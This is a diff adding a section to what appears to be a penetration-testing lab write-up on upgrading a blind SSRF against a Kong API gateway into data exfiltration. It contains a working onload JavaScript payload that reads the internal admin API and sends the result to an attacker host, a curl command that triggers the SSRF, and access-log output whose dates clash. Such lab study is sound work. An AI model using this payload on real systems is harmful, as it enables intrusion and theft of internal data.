@@ -584,3 +584,42 @@ The goal is to upgrade a blind SSRF (Server-Side Request Forgery) to a functiona
 The network architecture follows Docker's default bridge network behavior where containers can communicate internally on all ports, but only explicitly published ports are accessible from outside. This explains why port `8000` is accessible externally (published) while port `8001` is only available for internal container communication (exposed but not published).
 The JavaScript will execute from the Chrome browser's context, allowing it to make HTTP requests to internal services that would be unreachable from external attackers, effectively turning the blind SSRF into a data exfiltration channel.
 
+Let's create a new HTML page with a JavaScript function. First, the function will make a request to the Kong Admin API. If CORS is enabled and permissive enough on the Admin API, our JavaScript function will be able to access the response body and send it back to the web server running on our Kali host. If this doesn't work, we will have to consult the documentation for the Kong Admin API and determine what we can do without CORS.
+
+```html
+<html>
+<head>
+<script>
+function exfiltrate() {
+    fetch("http://172.16.16.2:8001")
+    .then((response) => response.text())
+    .then((data) => {
+        fetch("http://192.168.45.203/callback?" + encodeURIComponent(data));
+    }).catch(err => {
+        fetch("http://192.168.45.203/error?" + encodeURIComponent(err));
+    }); 
+}
+</script>
+</head>
+<body onload='exfiltrate()'>
+<div></div>
+</body>
+</html>
+```
+After placing the JavaScript function in an HTML file in our webroot, we will again call the Render API on the new HTML page.
+
+Let's trigger the SSRF vulnerability
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.16.5:9000/api/render?url=http://192.168.45.203/exfil.html"}' http://apigateway:8000/files/import
+{"errors":[{"message":"You don't have permission to access this.","extensions":{"code":"FORBIDDEN"}}]}                                                                                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$ 
+```
+When we check access.log, we should have the callback message.
+```log
+kali@kali:~$ sudo tail /var/log/apache2/access.log 
+...
+192.168.120.135 - - [25/Feb/2021:13:18:47 -0500] "GET /exfil.html HTTP/1.1" 200 562 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
+192.168.217.135 - - [29/Jul/2025:13:01:10 -0400] "GET /callback?%7B%22plugins%22%3A%7B%22enabled_in_cluster%22%3A%5B%22key-auth%22%5D%2C%22available_on_server%22%3A%7B%22grpc-web%22%3Atrue%2C%22correlation-id%22%3Atrue%2C%22...042%2C%22mem_cache_size%22%3A%22128m%22%2C%22pg_max_concurrent_queries%22%3A0%2C%22nginx_main_worker_p" 414 0 "-" "-"
+```
